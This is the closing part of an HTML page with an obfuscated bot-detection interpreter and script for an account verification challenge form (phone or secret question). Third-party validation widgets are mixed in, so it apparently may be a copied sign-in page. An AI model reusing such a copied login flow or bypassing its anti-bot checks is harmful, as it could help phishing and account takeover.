if(c!=a.v){if(d=G(a)<<8|G(a),c==a.i)if(c="",a.c[a.w]!=k)for(e=a.a(a.w);d--;)h=e[G(a)<<8|G(a)],c+=h;else{for(c=Array(d),e=0;e<d;e++)c[e]=G(a);for(d=c,c=[],h=e=0;e<d.length;)l=d[e++],128>l?c[h++]=String.fromCharCode(l):191<l&&224>l?(n=d[e++],c[h++]=String.fromCharCode((l&31)<<6|n&63)):(n=d[e++],m=d[e++],c[h++]=String.fromCharCode((l&15)<<12|(n&63)<<6|m&63));c=c.join("")}else for(c=Array(d),e=0;e<d;e++)c[e]=G(a);z(a,b,c)}},function(a){G(a)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),c=a.a(c),b=a.a(b),z(a,d,b[c])},function(a,b,c){b=G(a),c=G(a),b=a.a(b),z(a,c,t(b))},function(a,b,c,d,e){b=G(a),c=G(a),d=L(a,b),e=L(a,c),c!=a.h&&(d==a.i&&e==a.i?(a.c[c]==k&&z(a,c,""),z(a,c,a.a(c)+a.a(b))):e==a.o&&(0>d?(b=a.a(b),d==a.i&&(b=K(""+b)),c!=a.d&&c!=a.f&&c!=a.q||N(a,c,E(b.length,2)),N(a,c,b)):0<d&&N(a,c,E(a.a(b),d))))},function(a,b,c){b=G(a),c=G(a),z(a,c,function(a){return eval(a)}(a.a(b)))},function(a,b,c){b=G(a),c=G(a),z(a,c,a.a(c)-a.a(b))},function(a,b){b=H(a),z(a,b.P,b.O.apply(b.self,b.D))},function(a,b,c){b=G(a),c=G(a),z(a,c,a.a(c)%a.a(b))},function(a,b,c,d,e){b=G(a),c=a.a(G(a)),d=a.a(G(a)),e=a.a(G(a)),a.a(b).addEventListener(c,D(a,d,e,true),false)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),a.a(b)[a.a(c)]=a.a(d)},function(){},function(a,b,c){b=G(a),c=G(a),z(a,c,a.a(c)+a.a(b))},function(a,b,c){b=G(a),c=G(a),0!=a.a(b)&&z(a,a.b,a.a(c))},function(a,b,c,d){b=G(a),c=G(a),d=G(a),a.a(b)==a.a(c)&&z(a,d,a.a(d)+1)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),a.a(b)>a.a(c)&&z(a,d,a.a(d)+1)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),z(a,d,a.a(b)<<c)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),z(a,d,a.a(b)|a.a(c))},function(a,b){b=a.a(G(a)),A(a,b)},function(a,b,c,d){if(b=a.K.pop()){for(c=G(a);0<c;c--)d=G(a),b[d]=a.c[d];a.c=b}else z(a,a.b,a.e.length)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),z(a,d,(a.a(b)in a.a(c))+0)},function(a,b,c,d){b=G(a),c=a.a(G(a)),d=a.a(G(a)),z(a,b,D(a,c,d))},function(a,b,c){b=G(a),c=G(a),z(a,c,a.a(c)*a.a(b))},function(a,b,c,d){b=G(a),c=G(a),d=G(a),z(a,d,a.a(b)>>c)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),z(a,d,a.a(b)||a.a(c))},function(a,b,c,d,e){b=H(a),c=b.D,d=b.self,e=b.O;switch(c.length){case 0:c=new d[e];break;case 1:c=new d[e](c[0]);break;case 2:c=new d[e](c[0],c[1]);break;case 3:c=new d[e](c[0],c[1],c[2]);break;case 4:c=new d[e](c[0],c[1],c[2],c[3]);break;default:a.g(a.B);return}z(a,b.P,c)},function(a,b,c,d,e,h){if(b=G(a),c=G(a),d=G(a),e=G(a),b=a.a(b),c=a.a(c),d=a.a(d),a=a.a(e),"object"==t(b)){for(h in e=[],b)e.push(h);b=e}for(e=0,h=b.length;e<h;e+=d)c(b.slice(e,e+d),a)}],M.prototype.ia=function(a){return(a=window.performance)&&a.now?function(){return a.now()|0}:function(){return+new Date}}(),M.prototype.ha=function(a,b){return b=this.Q(),a&&a(b),b},M.prototype.t=function(a,b,c,d,e,h){try{for(b=5001,c=k,d=0,a=this.e.length;--b&&(d=this.a(this.b))<a;)try{z(this,this.m,d),e=G(this)%this.M.length,(c=this.M[e])?c(this):this.g(this.W,0,e)}catch(l){l!=this.A&&((h=this.a(this.l))?(z(this,h,l),z(this,this.l,0)):this.g(this.B,l))}b||this.g(this.X)}catch(n){try{this.g(this.B,n)}catch(m){v(this,m)}}return this.a(this.k)},M.prototype.Q=function(a,b,c,d,e,h,l,n,m,y,r){if(this.n)return this.n;try{if(this.s=false,b=this.a(this.d).length,c=this.a(this.f).length,d=this.a(this.j),this.c[this.L]&&C(this,this.a(this.L)),e=this.a(this.h),0<e.length&&N(this,this.d,E(e.length,2).concat(e),this.R),h=this.a(this.p)&255,h-=this.a(this.d).length+4,l=this.a(this.f),4<l.length&&(h-=l.length+3),0<h&&N(this,this.d,E(h,2).concat(w(h)),this.S),4<l.length&&N(this,this.d,E(l.length,2).concat(l),this.T),n=[3].concat(this.a(this.d)),window.btoa?(y=window.btoa(F(n)),m=y=y.replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,"")):m=k,m)m="!"+m;else for(m="",e=0;e<n.length;e++)r=n[e][this.J](16),1==r.length&&(r="0"+r),m+=r;this.a(this.d).length=b,this.a(this.f).length=c,z(this,this.j,d),a=m,this.s=true}catch(u){v(this,u),a=this.n}return a};try{window.addEventListener("unload",function(){},false)}catch(O){}s("botguard.bg",M),s("botguard.bg.prototype.invoke",M.prototype.ha);')})()</script>
<script type="text/javascript">
(function(){
  var challenges = [];
  var containsMapChallenge = false;
  var containsAuthzenChallenge = false;
  var containsOfflineOtpChallenge = false;
  var challengeValidators = [];
  
  challenges.push('PhoneVerificationChallenge');
  challenges.push('SecretQuestionChallenge');
  var setChallengeSelected = function(challenge, visible) {
  var radio = document.getElementById(challenge),
  label = document.getElementById(challenge + 'Label'),
  optionContent = document.getElementById(challenge + 'OptionContent');
  if (visible) {
  radio.checked = true;
  if (label) {
  label.className = "label-selected";
  }
  optionContent.className = "option-content option-content-selected";
  var inputElems = optionContent.getElementsByTagName('input')
  for (var i = 0; i < inputElems.length; i++) {
        if (inputElems[i].type != 'hidden') {
          inputElems[i].focus();
          break;
        }
      }
      if (!challengeValidators[challenge]) {
        
        document.getElementById('submitChallenge').disabled = false;
      } else {
        document.getElementById('submitChallenge').disabled =
            !challengeValidators[challenge]();
      }
    } else {
      radio.checked = false;
      if (label) {
        label.className = "label-unselected";
      }
      optionContent.className = "option-content option-content-unselected";
    }
  };

  
  var expandSelectedChallenge = function() {
    for (var i = 0; i < challenges.length; i++) {
      var challenge = challenges[i],
          radio = document.getElementById(challenge);
      setChallengeSelected(challenge, radio.checked);
    }
  };

  

  var calculateBotguardResponse = function () {
    
  try {
    document.bg.invoke(function(response) {
      document.getElementById('bgresponse').value = response;
    });
  } catch (err) {
    document.getElementById('bgresponse').value = '';
  }




    return true;
  }

  var formSubmitHandler = function() {
    
    document.getElementById('submitChallenge').disabled = true;

    if (containsMapChallenge) {
      if (!mapOnsubmitHandler()) {
        return false;
      }
    }

    
    calculateBotguardResponse();
    return true;
  };

  var initialize = function() {
    for (var i = 0; i < challenges.length; i++) {
      var radio = document.getElementById(challenges[i]);
      radio.onclick = function() {
        expandSelectedChallenge();
        return true;
      };
    }

    document.getElementById('challengeform').onsubmit = formSubmitHandler;
    if (containsMapChallenge) {
      mapOnloadHandler();
    }
    if (containsAuthzenChallenge) {
      authzenOnloadHandler();
    }
    if (containsOfflineOtpChallenge) {
      offlineOtpOnloadHandler();
    }

    expandSelectedChallenge();
  };
  window.onload = initialize;
})();

</script>
<script type="text/javascript">
(function() {
  var gaia = gaia || {};
  gaia.bind = function(fn, scope) {
  return function() {
  fn.apply(scope, arguments);
  };
  };
  gaia.forms = gaia.forms || {};
  gaia.forms.Form = function(formId) {
  this.form_ = document.getElementById(formId);
  this.formSubmitted_ = false;
  if (this.form_) {
  this.initForm_();
  }
  };
  gaia.forms.Form.prototype.initForm_ = function() {
  this.initSubmitListener_();
  };
  gaia.forms.Form.prototype.handleSubmit_ = function(e) {
  if (this.formSubmitted_) {
  e.preventDefault();
  } else {
  this.formSubmitted_ = true;
  }
  };
  gaia.forms.Form.prototype.initSubmitListener_ = function() {
  gaia_attachEvent(this.form_, 'submit',
  gaia.bind(this.handleSubmit_, this));
  };
  new gaia.forms.Form('challengeform');
  })();
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1", "integer", {useCharacterMasking:true});
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2");
</script>
  </body>
</html>